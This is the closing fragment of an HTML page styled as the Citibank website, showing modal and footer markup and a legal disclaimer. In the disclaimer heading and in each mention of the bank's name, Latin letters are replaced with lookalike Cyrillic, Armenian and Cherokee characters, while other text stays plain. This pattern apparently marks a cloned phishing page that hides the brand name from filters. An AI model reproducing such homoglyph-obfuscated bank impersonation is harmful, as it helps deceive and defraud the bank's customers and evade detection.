                                    <div _ngcontent-ssr-c58="" class="citi-modal-controls">
                                      <!---->
                                    </div><!---->
                                  </div><!----><!---->
                                </div>
                              </div>
                              <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true">
                              </div>
                            </div>
                          </div>
                          <div _ngcontent-ssr-c58="" class="modal-backdrop citi-modal-backdrop fade"
                            style="display: none;"></div>
                        </citi-modal><!----></li><!---->
                    </ul><!----><!---->
                  </div>
                </div><!---->
              </citi-footer-sub-navigation><citi-footer-disclaimer _ngcontent-ssr-c114="" _nghost-ssr-c117="">
                <div _ngcontent-ssr-c117="" class="disclaimer">
                  <div _ngcontent-ssr-c117="" class="content">
                    <div _ngcontent-ssr-c117="" class="text">
                      <h4>Ӏmроrtаոt Ꮮеgаⅼ Ꭰіѕсlοѕurеѕ &amp; Information</h4>
                      <p>Ꮯіtіbаոk.com provides information about and access to accounts and financial services provided
                        by Ꮯіtіbаոk, N.A. and its affiliates in the United States and its territories. It does not, and
                        should not be construed as, an offer, invitation or solicitation of services to individuals
                        outside of the United States.</p>
                      <p>Terms, conditions and fees for accounts, products, programs and services are subject to change.
                        Not all accounts, products, and services as well as pricing described here are available in all
                        jurisdictions or to all customers. Your eligibility for a particular product and service is
                        subject to a final determination by Ꮯіtіbаոk. Your country of citizenship, domicile, or
                        residence, if other than the United States, may have laws, rules, and regulations that govern or
                        affect your application for and use of our accounts, products and services, including laws and
                        regulations regarding taxes, exchange and/or capital controls that you are responsible for
                        following.</p>
                      <p>The products, account packages, promotional offers and services described in this website may
                        not apply to customers of International Personal Bank U.S. in the Citigold<sup>®</sup> Private
                        Client International, Citigold<sup>®</sup> International, Citi International Personal, Citi
                        Global Executive Preferred, and Citi Global Executive Account Packages.</p>
                    </div>
                  </div>
                </div><!---->
              </citi-footer-disclaimer></div>
          </citi-footer>
        </div>
      </citi-parent-layout></cbol-core></app-root>





</body>

</html>